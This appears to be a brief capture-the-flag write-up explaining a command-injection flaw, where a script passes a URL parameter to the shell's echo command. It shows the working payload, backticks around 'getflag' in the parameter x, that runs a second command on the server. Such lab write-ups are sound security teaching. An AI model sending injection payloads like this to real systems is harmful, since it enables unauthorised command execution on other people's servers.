The script use the system command 'echo' to print url params -> 'x'
run the script and request [remoteIp]?x=blabal -> it echo blabla
request [remoteIp]?x=`getflag` -> sing backquote sript exec cmd so we get ur flag :)